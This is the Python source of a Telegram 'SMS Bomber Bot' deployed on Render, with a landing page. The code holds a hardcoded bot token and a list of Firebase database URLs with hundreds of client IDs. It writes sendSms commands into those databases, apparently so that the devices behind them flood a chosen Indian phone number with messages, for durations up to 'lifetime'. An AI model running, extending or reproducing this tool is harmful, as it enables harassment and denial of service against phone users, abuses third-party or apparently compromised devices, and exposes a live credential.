import logging
import asyncio
import os
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
import aiohttp

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ============ BOT TOKEN (Render ENV se lega, warna yahan fallback) ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8955124391:AAE5yxh0if9cVmuSqL_k09Mw2QonMGgVuBk")

# ============ ACTIVE ATTACKS ============
active_attacks = {}

# ============ PROGRESS BAR ============
def create_progress_bar(percentage, length=20):
    filled = int(length * percentage / 100)
    return '█' * filled + '░' * (length - filled)

# ============ DATABASES ============
DATA = {
  "new-sexy": {"url": "https://new-sexy-default-rtdb.firebaseio.com", "auth": "key",
    "clients": ["-P0f0riuBqFNxYm8H-PW","-P0f0ryB9JgL2bTPVvck","-P0f0shlqNoR-XScF3U_","-P0f0twhK7zeC34TQ9kF","-P0f0uH-pr2IOVqrCyia","-P0f0vOXKxffYoGQLARR","-P0f0vezhBs-ko9l1GYY","-P0f0wAJHHvAvrGbD_2l","-P0f0wiI6mw7dJzPwZLh","-P0f0z4SinH6hxnsRDaB","-P0f0zr5YEaxHv9j-ohR","-P0f1-7o_uu979MwFKWt","-P0f1-gyDS6z_uehglZc","-P0f10n3KJ4DN3kn9QQ_","-P0f10z-OdTQM3uQSSP1","-P0f11ZMIyQRxPZ2hxWX","-P0f12PNS_WwWWeaOpdO","-P0f1392MEBjqnUsMDqG","-P0f13JbxsDgyocdMoJy","-P0f13JfpOm4hAD5GZpq","-P0f13QdQdWr1hV1Feql","-P0f14d574gEVwPQ-f4l","-P0f14hpyewsyKwhcCT5","-P0f15V6QBiSYRQZxasv","-P0f16A2ub8MPaPUeTTX","-P0f172z48hZnRx04pLf","0f340fc04f5cdb21","0f8842e60c15e757","10eaaa3cf1ec7b56","12aa2abce6a8544c","3044ba05eddc4094","3931f09d5957b556","3d1e05eb6e689c31","61103edab8885164","80c39d9c3b60b122","885a5cf21c9570ed","8fd3a886b8b2e849","95a432be3cea509f","a4b058c9c86d7fe2","a579509459c9fc74","a8128397470b9863","ad86d0ce3e522362","afc200cae8f91d8e","b00d5a778e946457","b0ca698cf31c070c","b862c64c636882da","bc3ef4f2c0caf02a","d4c889194332ffc5","d94e925d2c4177d6","e5e518c482e96cd5","ee9e2267330a71d3","f80fc123b7ae2b55"]},
  "sep12-aea6d": {"url": "https://sep12-aea6d-default-rtdb.firebaseio.com", "auth": "api",
    "clients": ["046720cd15a894d3","064b476593192b90","06b60c0b0e6630a8","08078dd20eb99f4d","0ae0bf927ee2564a","0c3aa35baf0ea393","0da6f7611bf81e40","139821ba5c06284b","13fa5636b4083f40","1478dc19a7c30013","1c9c1bdb9fea9af8","1db7a31a3fa84fa9","20bfc46ce7f3ad7f","20ed2b5ef8613993","24986188bcc1bbce","278ee03bd6c8c0b1","27ba54027b6f908c","27e822e44b434926","294709a098916a25","2a24223c38b6879f","2ada5e5c6c53162c","2ca0e0e51859f96c","2d06d9dd3013bcba","30aa5ac9356c0336","30c5fbf6dcda6d31","3141312a601d6bc1","3ada6262f79f8f9f","404ecc91679788d0","40d6f257b95c6c72","4876f7b571f395e4","48aa85b1b46e139c","4a952192b1064f0b","4c6b3cf34a5a4338","4d0588db369998d3","4d08cf21bcd6065a","4da3359017114e5c","4f5ce8919e32df74","5058dea886daa8e6","506f97948278d5c5","5d086ae0f56de909","60d415cdfe173928","639ed45a068eadfa","6525a2eeee4d336a","65f356668f66c7ce","6621f0b1a1dc473f","6a14faa3b631904c","6acc20ceaabd98bc","6cdee8e96272630b","718ca732e78c9308","71e2e319545d489d","74d54433c2b540f2","7615eadd1d5ddb02","77c248c20c9cadef","7e0db812ddc14294","7e7af20051947848","825d471b09dbd6a8","83def1d6bebcfc5f","889764877d6e5b4c","8bafe94c5712680f","8ea006301e4b7c4f","8f392c9e8736437e","8f47dcd6189a6131","900d8eb9248a08f9","93a7c73bbe31da53","959366d6b71aaa8a","99c0ff0ee16d043b","9a57dcfd6538fd5e","9a9b54999101961a","9b7b83de3f03dcca","9cd9b19eb5640085","9ed87332f69f4b48","9f59d9ec71d927b5","a0f7c7bc63031fe5","a1f023ed040c12a9","a202f6ebc6af49bc","a469ff8ea6f417cf","a4cbae38b1abfbef","a521b31a5232c8c1","a5498c02a8bd8211","a55ed38dc7671e71","a797dbf619197d6e","afa8cfa8b2652a45","b0bad9e671cc9daf","b6931abd14ef57d8","b8cb4dd1a212069a","bb4354702e81dce3","c1d824152457436a","c2be9fc8c888ec20","c353025e2776eceb","c523104103815228","c5311850d8bad57a","c58e3322e2fa0ddd","c6bc75e95d2a643b","c78cdc7ce5d3785f","c8202845a3846c0f","c8f455ec5bf4d2c1","c9a05289e3b35888","d0b4da26cf7612bb","d2038fbbf4d68bba","d284e78648417b2a","d3395ee98af2adaf","da6bff9ee69b9cc9","db75c0b868ad9038","dd3fdc1fdc60af03","ddc076f3b5074e8a","e1a3605cde0d0f49","e25917781fa7155f","ec1e713e35663175","f03bc26ec0ab5b75","f0b5ad889abbf66b","f55764aca3c30c47","f8842cce71cf63cc","f9923055646f0136","fef47e7aa8ea18a8"]},
  "me03-4e321": {"url": "https://me03-4e321-default-rtdb.firebaseio.com", "auth": "secret",
    "clients": ["009f7ec10a6dbd0e","01fc7da912669e5a","059b508dc3c96378","0d878a3668fb20b8","1d28ee3f5c8c9a71","1fca78e9e00409ed","2110c40f76b39e34","2235a92ebf2c66d6","32563f1d46d2d2d0","326bf8c8b18748ed","377fb6b19a83ea3e","3d688caff0412cd7","3ed6abc0939eacd9","41d090083af8dcf8","4d614c3ceb510f03","4ec7a990842a6e21","501216918a429622","530f90135051076f","56950890378da52d","5713be08d2d23f21","5e89c8004d1c9ea7","5f1e0cd77418fa53","60c3b12968e86c77","636ef3135d265fac","6476719a8218d559","6aff7ac540599ee3","6b90ac5450413ce6","73ac3e77158aa614","75ded64a4b0b9707","767d104faa32dbc4","7d3c361514b4f00d","7ff4d895ea8ddd18","88ae096075a4f8d3","8d7b3561d696e125","8e041dce13be7383","9006fb6f026a4c0c","90bfe16e25c85c32","93c18aec5e6db6af","96f8d23741fec03d","9b7093e913c883cd","a3b2f54b209f2df1","a5dc2188f76d0160","a5f431c14ef1a6e1","ae2640605bdbfcf6","aef3bbe1c8f63e58","b05f265015526199","b4c3a340f9d445e9","c49a992aa7bde7dd","c7b9229759e70f44","c8415df77dfae597","c9bf9b467856a8d4","cd5ada3c5cadc71b","ce7915c5fa9d72f9","d283c04ed1ac4c30","d2bb4c32b4181551","d4495265a8f58e40","d55b8699939625a5","d5780027a0d9b47a","d7d565e17a8552a4","da7b875d0da92cac","dc82de30f8ec5179","e310694fa5843e5b","e6dc3e2fa3195ac7","e934e529b67a6ef5","eb0128132d6f1ea4","ecb483c2315070ca","ee5c21db3af6b934","f1133d08c03404f1","f726dfbf2597192e"]},
  "yt01-75a36": {"url": "https://yt01-75a36-default-rtdb.firebaseio.com", "auth": "api",
    "clients": ["07e2aa47f35f0695","0aab4b69300b629d","0c92b71604d4a73f","0dddd6a74a20cbe5","11b33516f89f3042","13d825b43533c02c","15b57248b822c598","16d767f5157e7296","17c8713c02120238","1825c652aaf1ea50","1_07b225b8a3c71b78","1cce4f9c0eaa8970","1d45e1457a494d8b","1d85ee9a50d92cc1","1e683c51efa88c2e","251d1d72067721a4","2ed10db2b4dec072","2f33a7b07581682c","30b0c35152f7e9ef","32cc52d02bc4a412","3309989c6eadef1b","3395a7c711a1b892","36e80a8393a61d29","38eab8eba4a4f4d8","3b722670639aec2e","3c113cc07dae5909","3c5e9c834a05678d","3d59f88ef015fd0c","3fab9e0ad5cc2a46","4094e0f238954956","41680497e22946c3","4228cb11fab9896a","426215ec8976e05a","42b97811672ece39","4_fbe9f5a9da457414","4_fc9c6f4feadefac2","4c368ba2c421419b","5091bff4b7b9d93b","5706fd983b75b02c","58fe0cef5fd37eab","5a3fe2f7cc6969fe","5de20356df463c09","5e41aa86d6b5fdec","610fe19ab037b415","641187780a144f26","67743a9e78ed1cc9","68ee4b7447a95653","6938896c6031085a","6e2578f6d9319acc","72345f054f8e2341","740bc7c1a047f921","793ce510efe50e90","7e20c14d61d7837b","7fffab8fef1d28fb","879f588788f72ea6","8b24b498b550f1b9","90ef404750dcd421","94c94d4e085d5306","9b7a550955742948","9c4e3546d664cfb9","9d85b8160182c5a7","a5488e6d7ba3521d","aa9c669492ce7900","aad92d25577f070a","addd9c981afa7c87","af5e4ed8c13bfc4b","b7b9ffc1b8e46e18","bc17f7d9109d6462","c3bb051e8c8f114f","c58f0a8f41488bbb","c69e5792267c84f3","c80c76f7eda449a2","c84cf73eaeaf6e7f","c88a833e6c1f203f","ca072312b69cb5e9","ca0f26e4fcecaaf9","d0315972d7b2df53","d74385c8127c80e3","d7f571cd9724b2fa","dbae93623c182ed0","ddd23da3f150d7b2","df660f7487593a8d","e08151d9df850261","e2afe5b36b7133b6","e2d83c2d1a991299","e75e5c3b20579936","f1551ac6684b0093","f2a241e1c7e6da36","f3cd654b216acdf4","f6aff213693ad2b3"]},
  "mr-alone1": {"url": "https://mr-alone1-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "key",
    "clients": ["0266724a1a8155c9","050323f0c5a6c840","078da9a1f1ad5c20","0ac9347f25dd0cb3","0cc2dbe8bb642c8c","103996a790f2b294","1206feb1a291ae80","185985b44af92176","1f31313e13155026","1f6ff76dbaf72766","20bf8b795eaeb716","21ef98c87dc41417","22384c40c65abd4b","22a16b9d09f95aca","23d8a9624e47a42c","2459b376eaa0c64c","2744260e694121e7","2982421ddcbaca31","326f40767efd96d6","32dc6dbc545cc22e","381cde936203c1a0","3d480ddf4691fd9b","3e53393532ed34f3","3f194e1c985499f9","3fadab0060677319","41a4d9596c28e83f","5024a9f629af4018","54400e76d7c32d57","56ec046a3219d348","578705c615934268","5d1125c6e2acdb4e","631d0b1b6bb3b6df","63f9e97540ba85b8","6415ea7f42c86c31","66cc6e99ba00c785","68f84ea24eca68c0","69dae0cd42f3ea6c","6b636c3e9dea725d","6e9a4e46af7a46dc","70a8bc603bb64dae","71aa432b81de98ab","7bc575ce57074301","7c02ff535a54f4e6","7d2f3eceaa189e0b","8422e4b1b7cab574","85afc0a8a48e61dd","87a7102f9e73a9c6","8cbfb9df64dde43c","8d4234b748bfe258","8e23e12b96d07bd2","8eedad7b3708839d","94ba4b3ecc5d0686","9871a937ab019960","9c14f9fd19b099a1","aaede097a85f5a6e","b2b3327cf20f8b9c","b810d84a347ba782","b944ae0e2ec2f591","bacb5f49ea579d0b","c65713874103812f","c69fc749bec3de99","caca8705518cf0c3","ccccb1debe1002c1","dc3a94ab220681d4","def89f5987426f07","e173ce6eae8a386e","e34e576b9885a188","e824d7f7b0709caf","e97e615fea6e6aff","f544c6a94cde3dd9","f7a1cf6f6473ad54","f7cd070a2ebd1975","fc6e0210928f5af0"]},
  "admin-panel-client-a3ee5": {"url": "https://admin-panel-client-a3ee5-default-rtdb.firebaseio.com", "auth": "key",
    "clients": ["03de53b4c55d77b1","04bfc30afdfa1e5c","0854a33b5944b053","1daa93d2f37fc742","2a726c50b035b719","6b013358a426fab6","6c602a28b6e32983","737bc1f74ecbd879","84e1888c27438bb4","8a76fc731f6c9ff4","8b8428622d339e79","8eef0c20b75e0013","9e8c2d2a950aeaeb","a56dbe3d5060a92b","aa032eee8fab8c78","b79c172555c6feaf","b8d9fd65583ae4ca","b942538ed496b9af","bb8ba7ee90268bb9","d7fb4d5ebb9f6b22","dd4c94dc7447851e","e3e28b0234fde971","e5a515e7e0b8c605","ee15a96015e4afe7","eea443204cf690e9","fbf5ac1fb73ac9ce"]},
  "mr-prefect": {"url": "https://mr-prefect-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "key",
    "clients": ["0f35f99613f9f244","11ff978db9b1e827","123a666eac10b334","145a15d1036f04c2","1954a6def90a142d","1d17f7a599f58a6b","204f9fdcf08e34ac","21844afc29ba2792","248557b009faa03d","249ded04e5c43840","28a91080efee6215","30a80efbe8a4bc4c","30bc984c0b26a04c","39bf7c5a2d6d1041","3f4877bb434976a8","4571cc5a67c1ea79","46226b99d372bf9c","4d8d300f452e15ae","6576d72dfc473367","660bfc872da88ae6","66d6fef310e6a468","7bbdebcad0fae22e","7cf084d01aa57767","7d68dbbab69b3992","7fa32460ddca9085","82f63d7c61c2dc6a","8d331a587649a2da","8f3a695872b2787e","8fe2ba76797ba075","91a5a151d6a69791","9b334f95b953e242","9e0aeb7cda4573e6","a267f7d9cae679da","a46a364bfe8d4ebd","abf7bef537a1f868","b04819b6aa4e0c98","b1191b5fb256edb1","b1bb130dc2676f21","baafcc0430ee85ab","bad9050e3bad58b9","bbf8e8e48dc1bf9b","be789b4b69665712","c1b2f1794b2c918c","c2745f6320e4a263","c2e56c85b45b406c","c487cd1255513a3a","c4f5d1a4c2a93b2f","c501700c43eb8e78","c65863bb93793888","caffafb2d977ded7","ccbf07e5f416c8f8","cda8dfd8a27168f6","cef278c2efa4fc6f","cfb2ce82bd7ec9a8","d01fb430099fafed","d1a5df71191b2e38","d48314ad1ceae20b","d9ecb2055f5d5aaa","dd468315b5a2c9de","dfe31ae86658f6a5","ef54d03c94f5f59b","f036e998c7cef20f","f153eb665227d95e","f4a1aa94b1b688c4","f54c50fb3e8f992f","fb6d302379d639eb","fd69b8f27c1e0e92"]},
  "advance-3e0a9": {"url": "https://advance-3e0a9-default-rtdb.firebaseio.com", "auth": "key",
    "clients": ["03db74b4e6367fbb","0cb72d9134ccbf7a","1010aeaced89bfce","11839f6c09d774ad","15b53d912c060a6e","1ce8341cdf1323d0","1f1ddf7ba511a625","1f302d2b8e8ad290","247b2f7dd8721c8e","27c92d09d0eb95b9","2a28682b5414f74c","2c6067ec72cbd6a6","2fae372328cd8e0b","2fe5e93e22a3ffa7","31b3f6becdbfd5c5","32f5a70a36fd7f32","371eead62daeaaa1","3b7e2beaa5026bee","3f0337ea0abd6795","48a9a9dd0c7e89bf","4a6afd3b22740ac8","4bbb69197f87684a","4cb9ad7de229871a","4ea004a03ef222ab","5096e7601ccee515","600ce2212140cea5","60fbdac65130dde9","623f0e8d06ea1036","66e14cd020cd83d0","6939cfdd68fe7130","6a857bd2ba5a4abf","78ec99b743c784a1","79a0aae4d56e7fff","8006b1164410079f","82d84787570ea520","8b62dcb8ca6e2be7","8d795555b518aa3e","8d9db68f46184bf0","921076110a99fa9b","925dcaca6ad4074a","95c2851ce1552394","9703800407e0dbe7","98343179f2121238","9bc8e1e90fd28108","9cbd80efae06024c","9dcee7f8ac59070c","a24b6ea043fbf2af","a7652d623d51b82d","ab9506897508ac54","b1a01d296d7bb4f8","ba50fde2cef5977d","bc69f2691ea14675","c3829690c0d81153","cd70c9b71c83ab06","d8fbf3242d3613af","df1f469da337d0ed","e050cf11e78c7388","e45b38579513c14b","e74b2848cff8ac01","e988de8971d66cb8","eb8a6b67e29028ad","ebcb8ec276de4e54","f6bf14726f9aaf6e","f970de3ddbd41efa"]},
}

# SKIP unnecessary clients
SKIP = {"DEVICE_ID","Verify_Device","diviceinfo","registeredDevices","_scary_links",
        "registration","undefined","HEALTH_MONITOR","sms_fetch_config",
        "business-apps","projects","projects-data"}

# ============ DURATIONS ============
DURATIONS = {
    "1min": {"name": "1 Minute", "seconds": 60},
    "5min": {"name": "5 Minutes", "seconds": 300},
    "30min": {"name": "30 Minutes", "seconds": 1800},
    "1hour": {"name": "1 Hour", "seconds": 3600},
    "4hours": {"name": "4 Hours", "seconds": 14400},
    "24hours": {"name": "24 Hours", "seconds": 86400},
    "lifetime": {"name": "Lifetime", "seconds": 999999999}
}

# ============ SEND FUNCTION ============
async def send_sms(s, url, auth, cid, phone, msg):
    full_phone = "91" + phone
    payload = {"from": 1, "to": full_phone, "message": msg,
               "isSended": False, "timestamp": int(time.time()*1000)}
    api = f"{url}/clients/{cid}/webhookEvent/sendSms.json?auth={auth}"
    try:
        async with s.put(api, json=payload, timeout=8) as r:
            return r.status in (200, 201)
    except:
        return False

# ============ BOMBING TASK ============
async def bombing_task(phone, msg, duration_seconds, bot, chat_id, msg_id, user_id, duration_name):
    total_sent = 0
    total_failed = 0
    cycle = 0
    start_time = time.time()
    end_time = start_time + duration_seconds
    last_update = 0

    try:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text=f"🚀 *BOMBING IN PROGRESS*\n\n"
                 f"📱 Number: `{phone}`\n"
                 f"📝 Message: {msg[:30]}{'...' if len(msg) > 30 else ''}\n"
                 f"⏱️ Duration: {duration_name}\n\n"
                 f"📊 Progress: `{create_progress_bar(0)}` 0.0%\n"
                 f"🔄 Cycle: **0**\n✅ Sent: **0**\n❌ Failed: **0**\n"
                 f"⏰ Time Left: **{duration_name}**\n\n🛑 *Press STOP to end*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")]
            ])
        )
    except:
        pass

    async with aiohttp.ClientSession() as s:
        while time.time() < end_time and user_id in active_attacks and active_attacks[user_id].get("running"):
            cycle += 1
            for db_name, db_info in DATA.items():
                if time.time() >= end_time:
                    break
                if user_id not in active_attacks or not active_attacks[user_id].get("running"):
                    break

                url = db_info["url"]
                auth = db_info["auth"]
                cids = [c for c in db_info["clients"] if c not in SKIP]

                tasks = [send_sms(s, url, auth, cid, phone, msg) for cid in cids]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                ok = sum(1 for x in results if x is True)
                fail = len(results) - ok
                total_sent += ok
                total_failed += fail

            now = time.time()
            if now - last_update >= 2:
                last_update = now
                elapsed = now - start_time
                progress_pct = min(100, (elapsed / duration_seconds) * 100) if duration_seconds < 999999999 else 50
                progress_bar = create_progress_bar(progress_pct, 20)

                if duration_seconds < 999999999:
                    time_left = max(0, int(end_time - now))
                    if time_left >= 3600:
                        time_left_str = f"{time_left//3600}h {(time_left%3600)//60}m"
                    elif time_left >= 60:
                        time_left_str = f"{time_left//60}m {time_left%60}s"
                    else:
                        time_left_str = f"{time_left}s"
                else:
                    time_left_str = "∞"

                try:
                    await bot.edit_message_text(
                        chat_id=chat_id, message_id=msg_id,
                        text=f"🚀 *BOMBING IN PROGRESS*\n\n"
                             f"📱 Number: `{phone}`\n"
                             f"📝 Message: {msg[:30]}{'...' if len(msg) > 30 else ''}\n"
                             f"⏱️ Duration: {duration_name}\n\n"
                             f"📊 Progress: `{progress_bar}` {progress_pct:.1f}%\n"
                             f"🔄 Cycle: **{cycle}**\n✅ Sent: **{total_sent}**\n❌ Failed: **{total_failed}**\n"
                             f"⏰ Time Left: **{time_left_str}**\n\n🛑 *Press STOP to end*",
                        parse_mode='Markdown',
                        reply_markup=InlineKeyboardMarkup([
                            [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")]
                        ])
                    )
                except:
                    pass
            await asyncio.sleep(0.1)

    return total_sent, total_failed, cycle

# ============ KEYBOARDS ============
def get_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 Start Bombing", callback_data="start_bombing")],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ])

def get_cancel_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])

def get_duration_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⏱️ 1 Min", callback_data="dur_1min"),
         InlineKeyboardButton("⏱️ 5 Min", callback_data="dur_5min")],
        [InlineKeyboardButton("⏱️ 30 Min", callback_data="dur_30min"),
         InlineKeyboardButton("⏰ 1 Hour", callback_data="dur_1hour")],
        [InlineKeyboardButton("⏰ 4 Hours", callback_data="dur_4hours"),
         InlineKeyboardButton("⏰ 24 Hours", callback_data="dur_24hours")],
        [InlineKeyboardButton("♾️ LIFETIME", callback_data="dur_lifetime")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
    ])

# ============ HANDLERS ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"👋 Welcome {update.effective_user.first_name}!\n\n"
        "🔰 *SMS BOMBER BOT*\n\nClick **Start Bombing** to begin",
        parse_mode='Markdown', reply_markup=get_main_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if data == "start_bombing":
        active_attacks[user_id] = {"state": "waiting_for_number", "running": False}
        await query.edit_message_text(
            "📱 *Enter phone number (10 digits):*\n\nExample: `9876543210`",
            parse_mode='Markdown', reply_markup=get_cancel_keyboard()
        )

    elif data.startswith("dur_"):
        duration_key = data.replace("dur_", "")
        if user_id in active_attacks and duration_key in DURATIONS:
            session = active_attacks[user_id]
            duration_info = DURATIONS[duration_key]
            session["state"] = "bombing"
            session["running"] = True
            phone = session["phone"]
            message = session["message"]

            await query.edit_message_text(
                f"🚀 *STARTING...*\n\n"
                f"📱 Number: `{phone}`\n"
                f"📝 Message: {message[:30]}{'...' if len(message) > 30 else ''}\n"
                f"⏱️ Duration: {duration_info['name']}\n\n⚡ Initializing...",
                parse_mode='Markdown'
            )

            asyncio.create_task(
                run_bombing(user_id, phone, message, duration_info["seconds"],
                           context.bot, query.message.chat_id, query.message.message_id,
                           duration_info["name"])
            )

    elif data == "stop_attack":
        if user_id in active_attacks:
            active_attacks[user_id]["running"] = False
        await query.edit_message_text("🛑 *Attack Stopped!*",
            parse_mode='Markdown', reply_markup=get_main_keyboard())

    elif data == "help":
        await query.edit_message_text(
            "📖 *Help*\n\n1️⃣ Click Start Bombing\n2️⃣ Enter 10 digit number\n"
            "3️⃣ Enter message\n4️⃣ Choose duration\n5️⃣ Bot chalta rahega\n\n⚠️ Use responsibly!",
            parse_mode='Markdown', reply_markup=get_main_keyboard()
        )

    elif data == "cancel":
        if user_id in active_attacks:
            active_attacks[user_id]["running"] = False
            del active_attacks[user_id]
        await query.edit_message_text("❌ Cancelled", reply_markup=get_main_keyboard())

async def run_bombing(user_id, phone, msg, duration, bot, chat_id, msg_id, duration_name):
    total_sent, total_failed, cycles = await bombing_task(
        phone, msg, duration, bot, chat_id, msg_id, user_id, duration_name
    )
    try:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id,
            text=f"✅ *ATTACK COMPLETED*\n\n"
                 f"📱 Number: `{phone}`\n"
                 f"📝 Message: {msg[:30]}{'...' if len(msg) > 30 else ''}\n"
                 f"⏱️ Duration: **{duration_name}**\n\n"
                 f"📊 *Final Results:*\n🔄 Cycles: **{cycles}**\n"
                 f"✅ Total Sent: **{total_sent}**\n❌ Total Failed: **{total_failed}**\n"
                 f"📈 Grand Total: **{total_sent + total_failed}**",
            parse_mode='Markdown', reply_markup=get_main_keyboard()
        )
    except:
        pass
    if user_id in active_attacks:
        del active_attacks[user_id]

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id not in active_attacks:
        await update.message.reply_text("Use /start first", reply_markup=get_main_keyboard())
        return

    session = active_attacks[user_id]

    if session.get("state") == "waiting_for_number":
        if text.isdigit() and len(text) == 10:
            session["phone"] = text
            session["state"] = "waiting_for_message"
            await update.message.reply_text(
                f"✅ Number: `{text}`\n\n📝 *Now enter your message text:*",
                parse_mode='Markdown', reply_markup=get_cancel_keyboard()
            )
        else:
            await update.message.reply_text(
                "❌ *Invalid number!*\nEnter 10 digit number only",
                reply_markup=get_cancel_keyboard()
            )

    elif session.get("state") == "waiting_for_message":
        session["message"] = text
        session["state"] = "waiting_for_duration"
        await update.message.reply_text(
            f"✅ Message: `{text}`\n\n⏱️ *Now choose attack duration:*",
            parse_mode='Markdown', reply_markup=get_duration_keyboard()
        )

# ============================================================
# ============ 🌐 HTML LANDING PAGE + HEALTH SERVER ==========
# ============================================================

HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SMS Bomber Bot - Online</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: 'Segoe UI', Tahoma, sans-serif;
    background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
    color: #fff; min-height: 100vh;
    display: flex; align-items: center; justify-content: center;
    padding: 20px;
  }
  .container {
    background: rgba(255,255,255,0.05);
    border: 1px solid rgba(255,255,255,0.1);
    backdrop-filter: blur(10px);
    border-radius: 20px;
    padding: 40px 30px;
    max-width: 500px; width: 100%;
    text-align: center;
    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
  }
  .status-dot {
    display: inline-block; width: 12px; height: 12px;
    background: #00ff88; border-radius: 50%;
    margin-right: 8px;
    box-shadow: 0 0 10px #00ff88;
    animation: pulse 1.5s infinite;
  }
  @keyframes pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.5; transform: scale(1.2); }
  }
  h1 {
    font-size: 2rem; margin-bottom: 10px;
    background: linear-gradient(90deg, #00ff88, #00d4ff);
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    background-clip: text;
  }
  .status {
    display: inline-flex; align-items: center;
    background: rgba(0,255,136,0.1);
    border: 1px solid rgba(0,255,136,0.3);
    padding: 8px 18px; border-radius: 30px;
    font-size: 0.9rem; margin: 15px 0;
    color: #00ff88;
  }
  .info { color: #aaa; font-size: 0.95rem; line-height: 1.7; margin: 20px 0; }
  .btn {
    display: inline-block;
    background: linear-gradient(90deg, #00ff88, #00d4ff);
    color: #0f0c29; text-decoration: none;
    font-weight: bold; padding: 14px 32px;
    border-radius: 12px; margin-top: 20px;
    transition: transform 0.2s, box-shadow 0.2s;
    font-size: 1rem;
  }
  .btn:hover {
    transform: translateY(-3px);
    box-shadow: 0 10px 30px rgba(0,255,136,0.4);
  }
  .footer { margin-top: 25px; font-size: 0.8rem; color: #666; }
</style>
</head>
<body>
  <div class="container">
    <h1>🤖 SMS Bomber Bot</h1>
    <div class="status"><span class="status-dot"></span> Bot is Online & Running</div>
    <p class="info">
      Server successfully deployed on Render.<br>
      Telegram Bot is active 24/7.<br>
      Open Telegram and start using the bot now.
    </p>
    <a href="https://t.me/BotFather" class="btn" target="_blank">🚀 Open Telegram Bot</a>
    <div class="footer">© 2026 — Powered by Render</div>
  </div>
</body>
</html>
"""

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Root path -> HTML landing page
        if self.path == "/" or self.path == "/index.html":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode("utf-8"))
        # Any other path -> simple OK (for UptimeRobot pings)
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")

    def log_message(self, format, *args):
        pass  # silence default logging

def run_health_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), HealthHandler)
    logger.info(f"🌐 Health server running on port {port}")
    server.serve_forever()

# ============ MAIN ============
def main():
    # Start health/HTML server in background thread
    threading.Thread(target=run_health_server, daemon=True).start()

    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🤖 Bot Running...")
    application.run_polling()

if __name__ == "__main__":
    main()